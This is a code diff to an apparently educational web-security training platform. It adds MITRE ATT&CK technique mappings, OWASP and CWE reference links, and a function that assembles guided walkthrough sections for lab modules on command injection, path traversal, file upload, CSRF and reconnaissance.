+    "cmd_injection": {
+        "semicolon_basic": [
+            "T1595.002 · Active Scanning: Vulnerability Scanning",
+            "T1059 · Command and Scripting Interpreter",
+            "T1059.004 · Command and Scripting Interpreter: Unix Shell",
+        ],
+        "pipe_redirect": [
+            "T1595.002 · Active Scanning: Vulnerability Scanning",
+            "T1059 · Command and Scripting Interpreter",
+            "T1059.004 · Command and Scripting Interpreter: Unix Shell",
+        ],
+        "subshell": [
+            "T1595.002 · Active Scanning: Vulnerability Scanning",
+            "T1059 · Command and Scripting Interpreter",
+            "T1059.004 · Command and Scripting Interpreter: Unix Shell",
+        ],
+    },
+    "dir_traversal": {
+        "plain": [
+            "T1595.002 · Active Scanning: Vulnerability Scanning",
+            "T1083 · File and Directory Discovery",
+            "T1005 · Data from Local System",
+        ],
+        "encoded": [
+            "T1595.002 · Active Scanning: Vulnerability Scanning",
+            "T1027 · Obfuscated Files or Information",
+            "T1005 · Data from Local System",
+        ],
+        "absolute": [
+            "T1595.002 · Active Scanning: Vulnerability Scanning",
+            "T1083 · File and Directory Discovery",
+            "T1005 · Data from Local System",
+        ],
+    },
+    "file_upload": {
+        "wrong_extension": [
+            "T1595.002 · Active Scanning: Vulnerability Scanning",
+            "T1505.003 · Server Software Component: Web Shell",
+            "T1190 · Exploit Public-Facing Application",
+        ],
+        "mime_spoof": [
+            "T1595.002 · Active Scanning: Vulnerability Scanning",
+            "T1036 · Masquerading",
+            "T1505.003 · Server Software Component: Web Shell",
+        ],
+        "polyglot": [
+            "T1595.002 · Active Scanning: Vulnerability Scanning",
+            "T1027 · Obfuscated Files or Information",
+            "T1505.003 · Server Software Component: Web Shell",
+        ],
+    },
+    "csrf": {
+        "basic_forgery": [
+            "T1539 · Steal Web Session Cookie",
+            "T1190 · Exploit Public-Facing Application",
+            "T1565.001 · Data Manipulation: Stored Data Manipulation",
+        ],
+        "lure_page": [
+            "T1078 · Valid Accounts",
+            "T1189 · Drive-by Compromise",
+            "T1565.001 · Data Manipulation: Stored Data Manipulation",
+        ],
+        "json_bypass": [
+            "T1078 · Valid Accounts",
+            "T1190 · Exploit Public-Facing Application",
+            "T1565.001 · Data Manipulation: Stored Data Manipulation",
+        ],
+    },
+    "recon": {
+        "manual": [
+            "T1594 · Search Victim-Owned Websites",
+            "T1592 · Gather Victim Host Information",
+            "T1595.002 · Active Scanning: Vulnerability Scanning",
+        ],
+        "wordlist": [
+            "T1595 · Active Scanning",
+            "T1595.003 · Active Scanning: Wordlist Scanning",
+            "T1083 · File and Directory Discovery",
+        ],
+        "comment_hunting": [
+            "T1594 · Search Victim-Owned Websites",
+            "T1592.002 · Gather Victim Host Information: Software",
+            "T1213 · Data from Information Repositories",
+        ],
+    },
+}
+
+
+# ── Authoritative references per module (OWASP / online databases) ──────────
+REFERENCES: Dict[str, Dict[str, str]] = {
+    "brute_force":   {"label": "OWASP: Brute Force Attack",        "url": "https://owasp.org/www-community/attacks/Brute_force_attack"},
+    "xss":           {"label": "OWASP: Cross Site Scripting (XSS)", "url": "https://owasp.org/www-community/attacks/xss/"},
+    "cmd_injection": {"label": "OWASP: Command Injection",          "url": "https://owasp.org/www-community/attacks/Command_Injection"},
+    "dir_traversal": {"label": "OWASP: Path Traversal",            "url": "https://owasp.org/www-community/attacks/Path_Traversal"},
+    "file_upload":   {"label": "OWASP: Unrestricted File Upload",  "url": "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"},
+    "csrf":          {"label": "OWASP: Cross-Site Request Forgery", "url": "https://owasp.org/www-community/attacks/csrf"},
+    "recon":         {"label": "OWASP WSTG: Information Gathering", "url": "https://owasp.org/www-project-web-security-testing-guide/"},
+}
+
+DATABASE_REFERENCES: Dict[str, List[Dict[str, str]]] = {
+    "brute_force": [
+        {"label": "OWASP Brute Force", "url": "https://owasp.org/www-community/attacks/Brute_force_attack", "kind": "OWASP"},
+        {"label": "CWE-307 Excessive Authentication Attempts", "url": "https://cwe.mitre.org/data/definitions/307.html", "kind": "CWE"},
+        {"label": "CWE-287 Improper Authentication", "url": "https://cwe.mitre.org/data/definitions/287.html", "kind": "CWE"},
+    ],
+    "xss": [
+        {"label": "OWASP Cross Site Scripting", "url": "https://owasp.org/www-community/attacks/xss/", "kind": "OWASP"},
+        {"label": "CWE-79 Cross-site Scripting", "url": "https://cwe.mitre.org/data/definitions/79.html", "kind": "CWE"},
+        {"label": "OWASP WSTG Client-side Testing", "url": "https://owasp.org/www-project-web-security-testing-guide/", "kind": "WSTG"},
+    ],
+    "cmd_injection": [
+        {"label": "OWASP Command Injection", "url": "https://owasp.org/www-community/attacks/Command_Injection", "kind": "OWASP"},
+        {"label": "CWE-78 OS Command Injection", "url": "https://cwe.mitre.org/data/definitions/78.html", "kind": "CWE"},
+        {"label": "CAPEC-248 Command Injection", "url": "https://capec.mitre.org/data/definitions/248.html", "kind": "CAPEC"},
+    ],
+    "dir_traversal": [
+        {"label": "OWASP Path Traversal", "url": "https://owasp.org/www-community/attacks/Path_Traversal", "kind": "OWASP"},
+        {"label": "CWE-22 Path Traversal", "url": "https://cwe.mitre.org/data/definitions/22.html", "kind": "CWE"},
+        {"label": "CAPEC-126 Path Traversal", "url": "https://capec.mitre.org/data/definitions/126.html", "kind": "CAPEC"},
+    ],
+    "file_upload": [
+        {"label": "OWASP Unrestricted File Upload", "url": "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload", "kind": "OWASP"},
+        {"label": "CWE-434 Unrestricted Upload", "url": "https://cwe.mitre.org/data/definitions/434.html", "kind": "CWE"},
+        {"label": "CAPEC-650 Upload a Web Shell", "url": "https://capec.mitre.org/data/definitions/650.html", "kind": "CAPEC"},
+    ],
+    "csrf": [
+        {"label": "OWASP CSRF", "url": "https://owasp.org/www-community/attacks/csrf", "kind": "OWASP"},
+        {"label": "CWE-352 Cross-Site Request Forgery", "url": "https://cwe.mitre.org/data/definitions/352.html", "kind": "CWE"},
+        {"label": "OWASP CSRF Prevention Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html", "kind": "Cheat Sheet"},
+    ],
+    "recon": [
+        {"label": "OWASP WSTG Information Gathering", "url": "https://owasp.org/www-project-web-security-testing-guide/", "kind": "WSTG"},
+        {"label": "CWE-200 Exposure of Sensitive Information", "url": "https://cwe.mitre.org/data/definitions/200.html", "kind": "CWE"},
+        {"label": "ATT&CK Reconnaissance", "url": "https://attack.mitre.org/tactics/TA0043/", "kind": "MITRE"},
+    ],
+}
+
+MODULE_SECTION_PHASES: Dict[str, List[str]] = {
+    "recon": ["Reconnaissance", "Discovery", "Discovery"],
+    "brute_force": ["Credential access", "Account discovery", "Detection signal", "Valid accounts"],
+    "xss": ["Input discovery", "Payload delivery", "Execution"],
+    "cmd_injection": ["Input discovery", "Command execution", "Impact proof"],
+    "dir_traversal": ["Input discovery", "File discovery", "Collection"],
+    "file_upload": ["Upload baseline", "Payload delivery", "Public exposure"],
+    "csrf": ["Session setup", "Request forgery", "Stored data manipulation"],
+}
+
+
+def _section_phase(module_id: str, index: int) -> str:
+    phases = MODULE_SECTION_PHASES.get(module_id) or []
+    if not phases:
+        return "Attack path"
+    return phases[index] if index < len(phases) else phases[-1]
+
+
+def build_walkthrough(module_id: str, variant_id: Optional[str] = None) -> Dict[str, Any]:
+    """Assemble the full guided-room payload for a (module, variant) WITHOUT
+    needing a started session. Consumed by GET /api/modules/{id}/walkthrough
+    and rendered as the TryHackMe-style guided room."""
+    variants = MODULE_VARIANTS.get(module_id, {})
+    if not variant_id or variant_id not in variants:
+        variant_id = next(iter(variants), None)
+    variant = variants.get(variant_id) or {}
+    wt = (WALKTHROUGH.get(module_id, {}) or {}).get(variant_id) or {}
+    tasks = variant.get("tasks", [])
+    techs = (SECTION_TECHNIQUES.get(module_id, {}) or {}).get(variant_id, [])
+    secs  = wt.get("sections", [])
+    database_refs = DATABASE_REFERENCES.get(module_id, [])
+
+    sections: List[Dict[str, Any]] = []
+    for i in range(max(len(tasks), len(secs))):
+        sec = secs[i] if i < len(secs) else {}
+        t   = tasks[i] if i < len(tasks) else {}
+        sections.append({
+            "title":    t.get("title") or f"Step {i + 1}",
+            "phase":    sec.get("phase") or _section_phase(module_id, i),
+            "what":     sec.get("what"),
+            "how":      sec.get("how") or t.get("explain"),
+            "look_for": sec.get("look_for"),
+            "checkpoint": t.get("explain"),
+            "mitre":    techs[i] if i < len(techs) else None,
+            "database_refs": database_refs,
+        })
+
+    spec = PROGRESS_SPECS.get(module_id, {})
+    return {
+        "module_id":         module_id,
+        "variant_id":        variant_id,
+        "variant_name":      variant.get("name"),
+        "variant_description": variant.get("description"),
+        "difficulty":        variant.get("difficulty"),
+        "techniques":        variant.get("techniques", []),
+        "overview":          wt.get("overview"),
+        "defensive_insight": spec.get("defensive_insight"),
+        "reference":         REFERENCES.get(module_id),
+        "database_refs":     database_refs,
+        "sections":          sections,
+    }
+
+
 def get_variant_spec(module_id: str, variant_id: Optional[str]) -> Optional[Dict[str, Any]]:
     """Return the variant entry for (module, variant) or None if unknown."""
     variants = MODULE_VARIANTS.get(module_id)
@@ -1065,6 +1992,10 @@ def compute(module_id: str,
     else:
         events_for_progress = raw_events
 
+    # Teaching content (TryHackMe-style) for this (module, variant), if any.
+    walkthrough = get_walkthrough(module_id, variant_id_out)
+    wt_sections = (walkthrough or {}).get("sections", [])
+
     # Build task results
     tasks_out = []
     completed_idx: List[int] = []
@@ -1075,9 +2006,14 @@ def compute(module_id: str,
         complete = len(matches) >= min_count
         if complete:
             completed_idx.append(idx)
+        section = wt_sections[idx] if idx < len(wt_sections) else {}
         tasks_out.append({
             "title":          t["title"],
             "explain":        t.get("explain"),
+            # Rich teaching content — falls back to `explain` when absent.
+            "what":           section.get("what"),
+            "how":            section.get("how") or t.get("explain"),
+            "look_for":       section.get("look_for"),
             "complete":       complete,
             "match_count":    len(matches),
             "min_count":      min_count,
@@ -1183,6 +2119,8 @@ def compute(module_id: str,
         "variant_id":          variant_id_out,
         "variant_name":        (variant or {}).get("name"),
         "variant_difficulty":  (variant or {}).get("difficulty"),
+        "variant_description": (variant or {}).get("description"),
+        "variant_overview":    (walkthrough or {}).get("overview"),
         "progress_percent":    progress_percent,
         "completed_tasks":     completed_idx,
         "tasks":               tasks_out,
